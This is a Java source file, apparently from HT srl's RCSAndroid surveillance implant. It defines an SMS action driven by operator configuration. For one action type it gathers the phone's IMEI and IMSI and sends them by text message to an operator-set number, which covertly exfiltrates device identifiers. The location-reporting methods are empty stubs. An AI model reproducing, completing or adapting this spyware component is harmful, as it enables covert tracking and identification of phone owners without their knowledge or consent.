/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : SmsAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action;

import java.io.IOException;

import android.content.Intent;
import android.net.Uri;
import android.util.Log;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.Utils;
import com.ht.RCSAndroidGUI.util.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SmsAction.
 */
public class SmsAction extends SubAction {
	/** The Constant TYPE_LOCATION. */
	private static final int TYPE_LOCATION = 1;
	
	/** The Constant TYPE_SIM. */
	private static final int TYPE_SIM = 2;
	
	/** The Constant TYPE_TEXT. */
	private static final int TYPE_TEXT = 3;
	private static final String TAG = "SmsAction";

	/** The number. */
	String number;
	
	/** The text. */
	String text;
	
	/** The type. */
	int type;

	/**
	 * Instantiates a new sms action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public SmsAction(final int type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {

		try {
			switch (type) {
			case TYPE_TEXT:
			case TYPE_SIM:
				return sendSMS(text);

			case TYPE_LOCATION:
				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
				if (!getGPSPosition()) {
					errorLocation();
				}

				break;
			}
			return true;
		} catch (final Exception ex) {
			Log.d(TAG,"Error: " +ex.toString());
			return false;
		}
	}

	/**
	 * Error location.
	 */
	private void errorLocation() {
		if (!getCellPosition()) {
			sendSMS("Cell and GPS info not available");
		}
	}

	/**
	 * Gets the cell position.
	 *
	 * @return the cell position
	 */
	private boolean getCellPosition() {
		// TODO Auto-generated method stub
		return false;
	}

	/**
	 * Gets the gPS position.
	 *
	 * @return the gPS position
	 */
	private boolean getGPSPosition() {
		// TODO Auto-generated method stub
		return false;
	}

	/**
	 * Send sms.
	 *
	 * @param text the text
	 * @return true, if successful
	 */
	private boolean sendSMS(final String text) {
		final Uri smsUri = Uri.parse("tel:" + number);
		final Intent intent = new Intent(Intent.ACTION_VIEW, smsUri);
		intent.putExtra("sms_body", text);
		intent.setType("vnd.android-dir/mms-sms");
		Status.getAppContext().startActivity(intent);
		return true;
	}

	/**
	 * Parses the.
	 *
	 * @param confParams the conf params
	 * @return true, if successful
	 */
	protected boolean parse(final byte[] confParams) {
		final DataBuffer databuffer = new DataBuffer(confParams, 0, confParams.length);
		
		try {
			type = databuffer.readInt();
			Check.asserts(type >= 1 && type <= 3, "wrong type");
			int len = databuffer.readInt();
			byte[] buffer = new byte[len];
			databuffer.read(buffer);
			number = Utils.unspace(WChar.getString(buffer, true));

			switch (type) {
				case TYPE_TEXT:
					len = databuffer.readInt();
					buffer = new byte[len];
					databuffer.read(buffer);
					text = WChar.getString(buffer, true);
					break;
					
				case TYPE_LOCATION:
					// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
					break;
					
				case TYPE_SIM:
					final StringBuffer sb = new StringBuffer();
					final Device device = Device.self();
					if (Device.isCdma()) {
	
						// sb.append("SID: " + device.getSid() + "\n");
						// sb.append("ESN: "
						// + NumberUtilities.toString(device.getEsn(), 16)
						// + "\n");
					} 
					if (Device.isGprs()) {
						sb.append("IMEI: " + device.getImei() + "\n");
						sb.append("IMSI: " + device.getImsi() + "\n");
					}
	
					text = sb.toString();
					break;
					
				default:
					Log.d(TAG,"Error: SmsAction.parse,  Unknown type: " + type);
					break;
			}

		} catch (final IOException e) {
			return false;
		}

		return true;
	}

	/* (non-Javadoc)
	 * @see java.lang.Object#toString()
	 */
	@Override
	public String toString() {
		final StringBuffer sb = new StringBuffer();
		sb.append("Sms type: " + type);
		sb.append(" number: " + number);
		sb.append(" text: " + text);

		return sb.toString();
	}

}
